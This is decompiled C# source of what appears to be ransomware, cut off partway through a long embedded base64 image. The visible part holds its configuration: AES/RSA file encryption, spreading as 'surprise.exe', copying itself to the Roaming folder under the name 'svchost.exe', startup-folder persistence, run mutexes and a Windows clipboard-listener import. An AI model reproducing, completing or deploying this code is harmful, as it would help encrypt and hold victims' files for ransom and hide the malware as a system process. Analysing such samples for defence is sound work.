using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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